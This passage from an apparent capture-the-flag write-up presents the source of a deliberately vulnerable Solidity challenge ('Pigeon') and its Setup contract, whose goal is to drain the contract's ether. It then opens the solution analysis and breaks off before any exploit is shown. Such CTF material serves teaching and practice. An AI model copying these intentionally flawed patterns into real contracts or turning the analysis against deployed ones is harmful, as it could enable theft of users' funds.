</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">juniorPromotion</span> <span class="o">=</span> <span class="mi">8</span><span class="n">e18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">associatePromotion</span> <span class="o">=</span> <span class="mi">12</span><span class="n">e18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">becomeAPigeon</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="nb">code</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="nb">name</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span> <span class="n">codeName</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">codeName</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">code</span><span class="p">,</span> <span class="nb">name</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">codeToName</span><span class="p">[</span><span class="nb">code</span><span class="p">][</span><span class="nb">name</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">isPigeon</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">isPigeon</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">codeToName</span><span class="p">[</span><span class="nb">code</span><span class="p">][</span><span class="nb">name</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">codeName</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">task</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">codeName</span><span class="p">,</span> <span class="kt">address</span> <span class="n">person</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">data</span><span class="p">)</span> <span class="k">public</span> <span class="n">oneOfUs</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">person</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">isPigeon</span><span class="p">[</span><span class="n">person</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">person</span><span class="p">).</span><span class="nb">balance</span> <span class="o">!=</span> <span class="nb">data</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">points</span> <span class="o">=</span> <span class="nb">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">hasBeenCollected</span><span class="p">[</span><span class="n">person</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">dataCollection</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">person</span><span class="p">]</span> <span class="o">=</span> <span class="n">points</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">+=</span> <span class="n">points</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flyAway</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">codeName</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">rank</span><span class="p">)</span> <span class="k">public</span> <span class="n">oneOfUs</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">bag</span> <span class="o">=</span> <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">juniorPromotion</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">].</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">bag</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">associatePromotion</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">associatePigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">].</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">bag</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">seniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">].</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">bag</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">promotion</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">codeName</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">desiredRank</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">newCode</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">newName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span>
</span></span><span class="line"><span class="cl">        <span class="n">oneOfUs</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">desiredRank</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">!=</span> <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">juniorPromotion</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">ownerBalance</span> <span class="o">+=</span> <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kt">bytes32</span> <span class="n">newCodeName</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">newCode</span><span class="p">,</span> <span class="n">newName</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">codeToName</span><span class="p">[</span><span class="n">newCode</span><span class="p">][</span><span class="n">newName</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">associatePigeon</span><span class="p">[</span><span class="n">newCodeName</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">codeToName</span><span class="p">[</span><span class="n">newCode</span><span class="p">][</span><span class="n">newName</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">delete</span> <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">owner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">]}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">desiredRank</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">!=</span> <span class="n">associatePigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">associatePromotion</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">ownerBalance</span> <span class="o">+=</span> <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="kt">bytes32</span> <span class="n">newCodeName</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">newCode</span><span class="p">,</span> <span class="n">newName</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">codeToName</span><span class="p">[</span><span class="n">newCode</span><span class="p">][</span><span class="n">newName</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">seniorPigeon</span><span class="p">[</span><span class="n">newCodeName</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">codeToName</span><span class="p">[</span><span class="n">newCode</span><span class="p">][</span><span class="n">newName</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">delete</span> <span class="n">seniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">owner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">]}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">assignPigeon</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="nb">code</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="nb">name</span><span class="p">,</span> <span class="kt">address</span> <span class="n">pigeon</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">rank</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">external</span>
</span></span><span class="line"><span class="cl">        <span class="k">payable</span>
</span></span><span class="line"><span class="cl">        <span class="n">onlyOwner</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">codeName</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">code</span><span class="p">,</span> <span class="nb">name</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="n">pigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="n">pigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">isPigeon</span><span class="p">[</span><span class="n">pigeon</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">codeToName</span><span class="p">[</span><span class="nb">code</span><span class="p">][</span><span class="nb">name</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">associatePigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="n">pigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">associatePigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="n">pigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">isPigeon</span><span class="p">[</span><span class="n">pigeon</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">codeToName</span><span class="p">[</span><span class="nb">code</span><span class="p">][</span><span class="nb">name</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">seniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="n">pigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">seniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="n">pigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">isPigeon</span><span class="p">[</span><span class="n">pigeon</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">codeToName</span><span class="p">[</span><span class="nb">code</span><span class="p">][</span><span class="nb">name</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">exit</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">owner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">ownerBalance</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the main contract that we will interact with. Skimming through it, it seems that the contract is trying to simulate how job promotion works. Basically, a user can be set as a pigeon, and then it can do some basic tasks to get points, which can be used to get promotion. Later, we will check this contract again.</p>
<p><strong>Setup.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">&gt;=</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./Pigeon.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Pigeon</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">pigeon</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeon</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Pigeon</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Junior Pigeons
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">pigeon</span><span class="p">.</span><span class="n">assignPigeon</span><span class="p">(</span><span class="s">&#34;Numbuh&#34;</span><span class="p">,</span> <span class="s">&#34;6&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0x006</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeon</span><span class="p">.</span><span class="n">assignPigeon</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">5</span><span class="n">e18</span><span class="p">}(</span><span class="s">&#34;Numbuh&#34;</span><span class="p">,</span> <span class="s">&#34;5&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0x005</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">pigeon</span><span class="p">.</span><span class="n">assignPigeon</span><span class="p">(</span><span class="s">&#34;Numbuh&#34;</span><span class="p">,</span> <span class="s">&#34;4&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0x004</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeon</span><span class="p">.</span><span class="n">assignPigeon</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">10</span><span class="n">e18</span><span class="p">}(</span><span class="s">&#34;Numbuh&#34;</span><span class="p">,</span> <span class="s">&#34;3&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0x003</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">pigeon</span><span class="p">.</span><span class="n">assignPigeon</span><span class="p">(</span><span class="s">&#34;Numbuh&#34;</span><span class="p">,</span> <span class="s">&#34;2&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0x002</span><span class="p">),</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeon</span><span class="p">.</span><span class="n">assignPigeon</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">15</span><span class="n">e18</span><span class="p">}(</span><span class="s">&#34;Numbuh&#34;</span><span class="p">,</span> <span class="s">&#34;1&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0x001</span><span class="p">),</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="mi">34</span> <span class="kc">ether</span> <span class="o">&amp;&amp;</span> <span class="kt">address</span><span class="p">(</span><span class="n">pigeon</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span> <span class="kc">ether</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the setup contract. It deploy the <code>Pigeon</code> contract, and then assign some pigeons with different ranks, code, and name. Some of the pigeons were created with some ethers to initialize their <code>treasury</code> value.</p>
<p>To solve the challenge, the user&rsquo;s balance need to be &gt;= 34 ether, and we need to drain the <code>pigeon</code> balance.</p>
<h3 id="solution-1">Solution</h3>
<p>First, in order to interact further with the <code>Pigeon</code> contract, we need to be a pigeon first. To do that, we can call the <code>becomeAPigeon</code>. Let&rsquo;s check the code first to see whether there is a bug or not.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">becomeAPigeon</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="nb">code</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="nb">name</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span> <span class="n">codeName</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">codeName</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">code</span><span class="p">,</span> <span class="nb">name</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">codeToName</span><span class="p">[</span><span class="nb">code</span><span class="p">][</span><span class="nb">name</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">isPigeon</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
